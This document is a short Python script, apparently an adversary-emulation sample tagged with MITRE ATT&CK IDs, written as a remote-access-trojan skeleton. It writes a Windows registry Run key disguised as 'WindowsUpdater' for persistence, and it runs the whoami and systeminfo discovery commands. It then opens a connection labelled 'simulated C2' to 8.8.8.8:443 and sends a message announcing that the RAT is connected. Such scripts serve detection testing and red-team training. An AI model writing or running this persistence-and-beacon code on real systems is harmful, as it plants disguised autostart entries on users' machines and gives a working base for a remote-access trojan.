import subprocess
import socket
import winreg
import os
import sys

def add_persistence():
    try:
        # T1547.001 Registry Run Keys
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        print("Persistence established.")
    except Exception as e:
        print(f"Persistence failed: {e}")

def gather_info():
    # T1033 System Owner/User Discovery
    subprocess.run("whoami", shell=True, capture_output=True)
    # T1082 System Information Discovery
    subprocess.run("systeminfo", shell=True, capture_output=True)

def connect_c2():
    try:
        # T1071 Application Layer Protocol (simulated C2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 443))
        s.send(b"RAT connected and awaiting commands...\n")
        s.close()
    except:
        pass

if __name__ == "__main__":
    add_persistence()
    gather_info()
    connect_c2()
